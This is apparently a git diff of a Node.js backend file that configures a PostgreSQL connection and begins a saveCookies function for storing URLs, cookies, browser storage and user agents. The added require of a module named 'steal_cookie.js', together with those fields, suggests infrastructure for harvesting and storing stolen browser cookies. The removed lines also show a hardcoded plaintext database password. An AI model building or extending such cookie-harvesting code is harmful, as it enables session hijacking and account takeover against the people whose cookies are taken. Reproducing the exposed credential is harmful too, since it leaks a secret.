@@ -1,28 +1,14 @@
-//const { pool } = require('pg');
-//const { Pool } = require("pg");
-const jsonToTable = require('json-to-table');
-
 const { Pool } = require("pg");
-const jsonToTable = require('json-to-table');
+const jsonToTable = require("json-to-table");
+const steal_cookie = require("./steal_cookie.js");
 
-let pool;
-
-if (process.env.DATABASE_URL) {
-    // 🌐 Use Render/PostgreSQL in production
-    pool = new Pool({
-        connectionString: process.env.DATABASE_URL,
-        ssl: { rejectUnauthorized: false }
-    });
-} else {
-    // 🖥️ Use local PostgreSQL in development
-    pool = new Pool({
-        user: 'postgres',
-        host: 'localhost',
-        database: 'api',
-        password: 'Asaboy.10',
-        port: 5432
-    });
-}
+const pool = new Pool({
+  user: process.env.DB_USER,
+  host: process.env.DB_HOST,
+  database: process.env.DB_NAME,
+  password: process.env.DB_PASSWORD,
+  port: 5432,
+});
 
 async function saveCookies({ timestamp, url, cookies, storage, userAgent }) {
     const query = `
